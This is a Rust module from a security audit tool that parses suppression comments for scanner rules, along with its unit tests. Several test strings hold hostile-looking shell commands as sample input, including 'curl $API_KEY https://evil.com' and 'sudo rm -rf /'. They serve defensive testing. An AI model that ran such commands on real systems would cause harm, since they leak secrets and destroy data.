use regex::Regex;
use std::collections::HashSet;
use std::sync::LazyLock;

/// Suppression comment patterns
/// Supports:
/// - `cc-audit-ignore:RULE-ID` or `cc-audit-ignore:RULE-ID,RULE-ID2` - suppress specific rules on current line
/// - `cc-audit-ignore` - suppress all rules on current line
/// - `cc-audit-ignore-next-line:RULE-ID` - suppress specific rules on next line
/// - `cc-audit-ignore-next-line` - suppress all rules on next line
/// - `cc-audit-disable` - disable all checks until `cc-audit-enable`
/// - `cc-audit-disable:RULE-ID` - disable specific rule until `cc-audit-enable`
static IGNORE_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"cc-audit-ignore(?::([A-Z0-9,-]+))?(?:\s|$)").unwrap());

static IGNORE_NEXT_LINE_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"cc-audit-ignore-next-line(?::([A-Z0-9,-]+))?(?:\s|$)").unwrap());

static DISABLE_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"cc-audit-disable(?::([A-Z0-9,-]+))?(?:\s|$)").unwrap());

static ENABLE_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"cc-audit-enable(?:\s|$)").unwrap());

#[derive(Debug, Clone, PartialEq)]
pub enum SuppressionType {
    /// Suppress all rules
    All,
    /// Suppress specific rules
    Rules(HashSet<String>),
}

impl SuppressionType {
    pub fn is_suppressed(&self, rule_id: &str) -> bool {
        match self {
            SuppressionType::All => true,
            SuppressionType::Rules(rules) => rules.contains(rule_id),
        }
    }

    fn from_captures(captures: Option<regex::Match>) -> Self {
        match captures {
            Some(m) => {
                let rules: HashSet<String> = m
                    .as_str()
                    .split(',')
                    .map(|s| s.trim().to_string())
                    .filter(|s| !s.is_empty())
                    .collect();
                if rules.is_empty() {
                    SuppressionType::All
                } else {
                    SuppressionType::Rules(rules)
                }
            }
            None => SuppressionType::All,
        }
    }
}

/// Manages suppression state while scanning content
#[derive(Debug, Default)]
pub struct SuppressionManager {
    /// Rules disabled for all subsequent lines (until enable)
    disabled: Option<SuppressionType>,
    /// Rules to suppress for the next line only
    suppress_next_line: Option<SuppressionType>,
}

impl SuppressionManager {
    pub fn new() -> Self {
        Self::default()
    }

    /// Process a line and update suppression state.
    /// Returns the suppression type for this line (if any).
    pub fn process_line(&mut self, line: &str) -> Option<SuppressionType> {
        // Check for enable (resets disabled state)
        if ENABLE_PATTERN.is_match(line) {
            self.disabled = None;
        }

        // Check for disable
        if let Some(caps) = DISABLE_PATTERN.captures(line) {
            self.disabled = Some(SuppressionType::from_captures(caps.get(1)));
        }

        // First, check if there's a pending next-line suppression from the previous line
        let pending_next_line = self.suppress_next_line.take();

        // Check for ignore-next-line on current line (for the NEXT line)
        if let Some(caps) = IGNORE_NEXT_LINE_PATTERN.captures(line) {
            self.suppress_next_line = Some(SuppressionType::from_captures(caps.get(1)));
        }

        // Determine current line suppression
        // Priority: pending next-line > inline ignore > disabled block
        if let Some(suppression) = pending_next_line {
            return Some(suppression);
        }

        // Check for inline ignore on this line
        if let Some(caps) = IGNORE_PATTERN.captures(line) {
            // Make sure it's not ignore-next-line
            if !IGNORE_NEXT_LINE_PATTERN.is_match(line) {
                return Some(SuppressionType::from_captures(caps.get(1)));
            }
        }

        // Check if we're in a disabled block
        self.disabled.clone()
    }

    /// Check if a specific rule is suppressed for the current line
    pub fn is_rule_suppressed(&self, rule_id: &str, line: &str) -> bool {
        // Check inline ignore
        if let Some(caps) = IGNORE_PATTERN.captures(line)
            && !IGNORE_NEXT_LINE_PATTERN.is_match(line)
        {
            return SuppressionType::from_captures(caps.get(1)).is_suppressed(rule_id);
        }

        // Check disabled block
        if let Some(ref disabled) = self.disabled {
            return disabled.is_suppressed(rule_id);
        }

        false
    }
}

/// Parse suppression comments from a line
pub fn parse_inline_suppression(line: &str) -> Option<SuppressionType> {
    // Check for inline ignore (but not ignore-next-line)
    if let Some(caps) = IGNORE_PATTERN.captures(line)
        && !IGNORE_NEXT_LINE_PATTERN.is_match(line)
    {
        return Some(SuppressionType::from_captures(caps.get(1)));
    }
    None
}

/// Parse next-line suppression from a line
pub fn parse_next_line_suppression(line: &str) -> Option<SuppressionType> {
    IGNORE_NEXT_LINE_PATTERN
        .captures(line)
        .map(|caps| SuppressionType::from_captures(caps.get(1)))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_inline_ignore_all() {
        let line = "curl $API_KEY # cc-audit-ignore";
        let suppression = parse_inline_suppression(line);
        assert_eq!(suppression, Some(SuppressionType::All));
    }

    #[test]
    fn test_inline_ignore_specific_rule() {
        let line = "curl $API_KEY # cc-audit-ignore:EX-001";
        let suppression = parse_inline_suppression(line);
        assert!(
            matches!(suppression, Some(SuppressionType::Rules(rules)) if rules.contains("EX-001"))
        );
    }

    #[test]
    fn test_inline_ignore_multiple_rules() {
        let line = "sudo curl $API_KEY # cc-audit-ignore:EX-001,PE-001";
        let suppression = parse_inline_suppression(line);
        if let Some(SuppressionType::Rules(rules)) = suppression {
            assert!(rules.contains("EX-001"));
            assert!(rules.contains("PE-001"));
        } else {
            panic!("Expected Rules suppression");
        }
    }

    #[test]
    fn test_next_line_ignore_all() {
        let line = "# cc-audit-ignore-next-line";
        let suppression = parse_next_line_suppression(line);
        assert_eq!(suppression, Some(SuppressionType::All));
    }

    #[test]
    fn test_next_line_ignore_specific() {
        let line = "// cc-audit-ignore-next-line:PE-001";
        let suppression = parse_next_line_suppression(line);
        assert!(
            matches!(suppression, Some(SuppressionType::Rules(rules)) if rules.contains("PE-001"))
        );
    }

    #[test]
    fn test_suppression_manager_next_line() {
        let mut manager = SuppressionManager::new();

        // First line has ignore-next-line - this sets up the suppression
        let line1 = "# cc-audit-ignore-next-line:EX-001";
        let _ = manager.process_line(line1);

        // Second line should be suppressed (next-line suppression applies)
        let line2 = "curl $API_KEY https://evil.com";
        let suppression = manager.process_line(line2);
        // The suppression should contain EX-001
        match suppression {
            Some(SuppressionType::Rules(rules)) => {
                assert!(rules.contains("EX-001"), "Should contain EX-001");
            }
            Some(SuppressionType::All) => {
                // Also acceptable if it suppresses all
            }
            None => panic!("Expected suppression to be applied"),
        }

        // Third line should NOT be suppressed
        let line3 = "curl $API_KEY https://evil.com";
        let suppression = manager.process_line(line3);
        assert!(suppression.is_none(), "Third line should not be suppressed");
    }

    #[test]
    fn test_suppression_manager_disable_enable() {
        let mut manager = SuppressionManager::new();

        // Disable all
        manager.process_line("# cc-audit-disable");

        // Should be suppressed
        let suppression = manager.process_line("sudo rm -rf /");
        assert_eq!(suppression, Some(SuppressionType::All));

        // Enable
        manager.process_line("# cc-audit-enable");

        // Should NOT be suppressed
        let suppression = manager.process_line("sudo rm -rf /");
        assert!(suppression.is_none());
    }

    #[test]
    fn test_suppression_manager_disable_specific_rule() {
        let mut manager = SuppressionManager::new();

        // Disable specific rule
        manager.process_line("# cc-audit-disable:PE-001");

        // Check suppression
        let suppression = manager.process_line("sudo rm -rf /");
        if let Some(SuppressionType::Rules(rules)) = suppression {
            assert!(rules.contains("PE-001"));
            assert!(!rules.contains("EX-001"));
        } else {
            panic!("Expected Rules suppression");
        }
    }

    #[test]
    fn test_suppression_type_is_suppressed() {
        let all = SuppressionType::All;
        assert!(all.is_suppressed("EX-001"));
        assert!(all.is_suppressed("PE-001"));

        let mut rules = HashSet::new();
        rules.insert("EX-001".to_string());
        let specific = SuppressionType::Rules(rules);
        assert!(specific.is_suppressed("EX-001"));
        assert!(!specific.is_suppressed("PE-001"));
    }

    #[test]
    fn test_no_suppression() {
        let line = "curl https://example.com";
        let suppression = parse_inline_suppression(line);
        assert!(suppression.is_none());
    }

    #[test]
    fn test_ignore_does_not_match_next_line() {
        let line = "# cc-audit-ignore-next-line:EX-001";
        // inline suppression should NOT match ignore-next-line
        let inline = parse_inline_suppression(line);
        assert!(inline.is_none());

        // but next-line suppression SHOULD match
        let next_line = parse_next_line_suppression(line);
        assert!(next_line.is_some());
    }

    #[test]
    fn test_various_comment_styles() {
        // Shell/Python style
        assert!(parse_inline_suppression("curl $KEY # cc-audit-ignore").is_some());

        // JavaScript/Rust style
        assert!(parse_inline_suppression("fetch(url) // cc-audit-ignore").is_some());

        // With explanation
        assert!(
            parse_inline_suppression("sudo apt update # cc-audit-ignore:PE-001 - legitimate use")
                .is_some()
        );
    }

    #[test]
    fn test_suppression_with_spaces() {
        // Test without spaces (standard format)
        let line = "curl $KEY # cc-audit-ignore:EX-001,PE-001";
        let suppression = parse_inline_suppression(line);
        if let Some(SuppressionType::Rules(rules)) = suppression {
            assert!(rules.contains("EX-001"), "Should contain EX-001");
            assert!(rules.contains("PE-001"), "Should contain PE-001");
        } else {
            panic!("Expected Rules suppression");
        }
    }

    #[test]
    fn test_is_rule_suppressed_inline() {
        let manager = SuppressionManager::new();
        let line = "curl $API_KEY # cc-audit-ignore:EX-001";

        assert!(manager.is_rule_suppressed("EX-001", line));
        assert!(!manager.is_rule_suppressed("PE-001", line));
    }

    #[test]
    fn test_is_rule_suppressed_all() {
        let manager = SuppressionManager::new();
        let line = "curl $API_KEY # cc-audit-ignore";

        assert!(manager.is_rule_suppressed("EX-001", line));
        assert!(manager.is_rule_suppressed("PE-001", line));
    }

    #[test]
    fn test_is_rule_suppressed_disabled_block() {
        let mut manager = SuppressionManager::new();
        manager.process_line("# cc-audit-disable:PE-001");

        let line = "sudo rm -rf /";
        assert!(manager.is_rule_suppressed("PE-001", line));
        assert!(!manager.is_rule_suppressed("EX-001", line));
    }

    #[test]
    fn test_is_rule_suppressed_disabled_all() {
        let mut manager = SuppressionManager::new();
        manager.process_line("# cc-audit-disable");

        let line = "sudo rm -rf /";
        assert!(manager.is_rule_suppressed("PE-001", line));
        assert!(manager.is_rule_suppressed("EX-001", line));
    }

    #[test]
    fn test_is_rule_suppressed_not_suppressed() {
        let manager = SuppressionManager::new();
        let line = "curl https://example.com";

        assert!(!manager.is_rule_suppressed("EX-001", line));
        assert!(!manager.is_rule_suppressed("PE-001", line));
    }

    #[test]
    fn test_is_rule_suppressed_ignore_next_line_does_not_suppress_current() {
        let manager = SuppressionManager::new();
        let line = "# cc-audit-ignore-next-line:EX-001";

        // ignore-next-line should NOT suppress the current line
        assert!(!manager.is_rule_suppressed("EX-001", line));
    }

    #[test]
    fn test_suppression_manager_inline_has_priority_over_disabled() {
        let mut manager = SuppressionManager::new();

        // Disable specific rule
        manager.process_line("# cc-audit-disable:PE-001");

        // Inline ignore should also work
        let line = "curl $API_KEY # cc-audit-ignore:EX-001";
        let suppression = manager.process_line(line);

        // Should be EX-001 from inline, not PE-001 from disabled
        if let Some(SuppressionType::Rules(rules)) = suppression {
            assert!(rules.contains("EX-001"));
        } else {
            panic!("Expected Rules suppression");
        }
    }

    #[test]
    fn test_suppression_type_from_captures_empty_string() {
        // When captured group is empty, should return All
        let suppression = SuppressionType::from_captures(None);
        assert_eq!(suppression, SuppressionType::All);
    }

    #[test]
    fn test_disable_and_enable_sequence() {
        let mut manager = SuppressionManager::new();

        // Initially not suppressed
        assert!(manager.process_line("curl $API_KEY").is_none());

        // Disable
        manager.process_line("# cc-audit-disable");

        // Now suppressed
        assert!(manager.process_line("curl $API_KEY").is_some());

        // Enable
        manager.process_line("# cc-audit-enable");

        // No longer suppressed
        assert!(manager.process_line("curl $API_KEY").is_none());
    }

    #[test]
    fn test_suppression_manager_default() {
        let manager = SuppressionManager::default();
        let line = "curl https://example.com";
        assert!(!manager.is_rule_suppressed("EX-001", line));
    }

    #[test]
    fn test_next_line_suppression_only_applies_once() {
        let mut manager = SuppressionManager::new();

        // Set up next-line suppression
        manager.process_line("# cc-audit-ignore-next-line");

        // First subsequent line is suppressed
        let suppression1 = manager.process_line("curl $API_KEY");
        assert!(suppression1.is_some());

        // Second subsequent line is NOT suppressed
        let suppression2 = manager.process_line("curl $API_KEY");
        assert!(suppression2.is_none());
    }

    #[test]
    fn test_suppression_type_debug() {
        let all = SuppressionType::All;
        assert!(format!("{:?}", all).contains("All"));

        let mut rules = HashSet::new();
        rules.insert("EX-001".to_string());
        let specific = SuppressionType::Rules(rules);
        assert!(format!("{:?}", specific).contains("Rules"));
    }

    #[test]
    fn test_suppression_type_clone() {
        let all = SuppressionType::All;
        let cloned = all.clone();
        assert_eq!(all, cloned);

        let mut rules = HashSet::new();
        rules.insert("EX-001".to_string());
        let specific = SuppressionType::Rules(rules);
        let cloned_specific = specific.clone();
        assert_eq!(specific, cloned_specific);
    }

    #[test]
    fn test_suppression_manager_debug() {
        let manager = SuppressionManager::new();
        assert!(format!("{:?}", manager).contains("SuppressionManager"));
    }

    #[test]
    fn test_parse_next_line_suppression_no_match() {
        let line = "curl https://example.com";
        assert!(parse_next_line_suppression(line).is_none());
    }

    #[test]
    fn test_process_line_with_inline_ignore() {
        let mut manager = SuppressionManager::new();
        let line = "curl $API_KEY # cc-audit-ignore:EX-001";
        let suppression = manager.process_line(line);

        // Should get inline suppression
        assert!(matches!(suppression, Some(SuppressionType::Rules(ref r)) if r.contains("EX-001")));
    }

    #[test]
    fn test_process_line_with_inline_ignore_all() {
        let mut manager = SuppressionManager::new();
        let line = "curl $API_KEY # cc-audit-ignore";
        let suppression = manager.process_line(line);

        // Should get All suppression
        assert_eq!(suppression, Some(SuppressionType::All));
    }

    #[test]
    fn test_is_rule_suppressed_with_inline_all() {
        let manager = SuppressionManager::new();
        let line = "curl $API_KEY # cc-audit-ignore";

        // All rules should be suppressed
        assert!(manager.is_rule_suppressed("EX-001", line));
        assert!(manager.is_rule_suppressed("PE-001", line));
        assert!(manager.is_rule_suppressed("ANY-RULE", line));
    }

    #[test]
    fn test_suppression_type_rules_not_contains() {
        let mut rules = HashSet::new();
        rules.insert("EX-001".to_string());
        let specific = SuppressionType::Rules(rules);

        // Test that a rule not in the set is not suppressed
        assert!(!specific.is_suppressed("UNKNOWN-RULE"));
    }

    #[test]
    fn test_parse_inline_suppression_returns_rules() {
        let line = "curl $KEY # cc-audit-ignore:EX-001";
        let suppression = parse_inline_suppression(line);

        match suppression {
            Some(SuppressionType::Rules(rules)) => {
                assert!(rules.contains("EX-001"));
                assert_eq!(rules.len(), 1);
            }
            _ => panic!("Expected Rules suppression with one rule"),
        }
    }

    #[test]
    fn test_process_line_ignore_next_does_not_suppress_current() {
        let mut manager = SuppressionManager::new();

        // This line sets up next-line suppression
        let line = "# cc-audit-ignore-next-line:EX-001";
        let suppression = manager.process_line(line);

        // The current line should NOT be suppressed (suppression is for next line)
        assert!(suppression.is_none());
    }

    #[test]
    fn test_suppression_type_from_captures_commas_only() {
        // When rules list contains only commas, splitting results in empty strings
        // The regex [A-Z0-9,-]+ allows commas, so ",,," matches
        if let Some(caps) = IGNORE_PATTERN.captures("test # cc-audit-ignore:,,,") {
            let suppression = SuppressionType::from_captures(caps.get(1));
            // Commas-only rules should become All after filtering empty strings
            assert_eq!(suppression, SuppressionType::All);
        } else {
            panic!("Expected pattern to match");
        }
    }

    #[test]
    fn test_is_rule_suppressed_with_disabled_block() {
        let mut manager = SuppressionManager::new();

        // Disable a specific rule
        manager.process_line("# cc-audit-disable:PE-001");

        // Check is_rule_suppressed with the disabled rule (without inline comment)
        assert!(manager.is_rule_suppressed("PE-001", "sudo rm -rf /"));
        assert!(!manager.is_rule_suppressed("EX-001", "sudo rm -rf /"));
    }

    #[test]
    fn test_parse_inline_suppression_with_ignore_next_line_returns_none() {
        // ignore-next-line should not be matched by inline suppression
        let line = "# cc-audit-ignore-next-line:EX-001";
        let suppression = parse_inline_suppression(line);
        assert!(suppression.is_none());
    }

    #[test]
    fn test_process_line_with_ignore_next_line_pattern_does_not_inline_suppress() {
        let mut manager = SuppressionManager::new();

        // A line that contains "cc-audit-ignore-next-line" should NOT trigger inline suppression
        // IGNORE_PATTERN matches "cc-audit-ignore" within "cc-audit-ignore-next-line"
        // but we check and skip it
        let line = "# cc-audit-ignore-next-line";
        let suppression = manager.process_line(line);

        // Should return None for the current line (it's setting up next-line suppression)
        assert!(suppression.is_none());
    }

    #[test]
    fn test_is_rule_suppressed_with_ignore_next_line_pattern_returns_false() {
        let manager = SuppressionManager::new();

        // A line that contains "cc-audit-ignore-next-line" should NOT be treated as inline suppression
        let line = "# cc-audit-ignore-next-line:EX-001";

        // is_rule_suppressed should return false because ignore-next-line is not inline suppression
        assert!(!manager.is_rule_suppressed("EX-001", line));
        assert!(!manager.is_rule_suppressed("PE-001", line));
    }

    #[test]
    fn test_process_line_inline_ignore_without_next_line() {
        let mut manager = SuppressionManager::new();

        // Inline ignore (not ignore-next-line) should return Some
        let line = "sudo rm -rf / # cc-audit-ignore";
        let suppression = manager.process_line(line);

        // Should return SuppressionType::All for inline ignore without rules
        assert!(suppression.is_some());
        assert!(matches!(suppression, Some(SuppressionType::All)));
    }

    #[test]
    fn test_process_line_inline_ignore_with_specific_rules() {
        let mut manager = SuppressionManager::new();

        // Inline ignore with specific rules
        let line = "sudo rm -rf / # cc-audit-ignore:PE-001,PE-002";
        let suppression = manager.process_line(line);

        // Should return SuppressionType::Rules for inline ignore with rules
        assert!(suppression.is_some());
        if let Some(SuppressionType::Rules(rules)) = suppression {
            assert!(rules.iter().any(|r| r == "PE-001"));
            assert!(rules.iter().any(|r| r == "PE-002"));
        } else {
            panic!("Expected SuppressionType::Rules");
        }
    }
}
